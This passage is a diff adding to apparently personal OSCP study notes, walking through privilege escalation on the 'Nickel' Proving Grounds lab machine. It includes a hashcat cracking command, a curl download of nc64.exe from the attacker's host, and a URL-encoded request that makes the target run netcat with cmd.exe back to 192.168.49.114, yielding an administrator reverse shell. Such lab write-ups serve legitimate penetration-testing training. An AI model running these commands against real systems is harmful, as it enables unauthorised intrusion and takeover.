@@ -193,3 +193,36 @@ hashcat -m 10500 hash -a 0 /usr/share/wordlists/rockyou.txt --force
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_22h15m50s_012_.png)
 
+The document shows three links. The fisrt link may be able to execute command. 
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_22h28m46s_013_.png)
+
+After testing, I find that the link must be executed on the server side and service application be run as administrator.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_22h52m10s_014_.png)
+
+So we can execute a reverse shell command through this service. Get the ```nc64.exe``` program from our pc. (You can find nc64.exe on the internet)
+
+(avoid blocked port)
+
+```
+curl.exe -o nc64.exe http://192.168.49.114/nc64.exe
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_23h06m09s_015_.png)
+
+Because we have to pass the command through HTTP serivce, we have to encode our command.
+
+```
+curl-X GET http://nickel/?/Users/ariah/Documents/nc64.exe -e cmd.exe 192.168.49.114 80
+```
+
+URL Encode
+
+```
+curl -X GET http://nickel/?%2FUsers%2Fariah%2FDocuments%2Fnc64.exe%20-e%20cmd.exe%20192.168.49.114%2080
+```
+
+We get the shell with administrator.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Nickel/Nickel_2021.11.06_23h23m25s_016_.png)
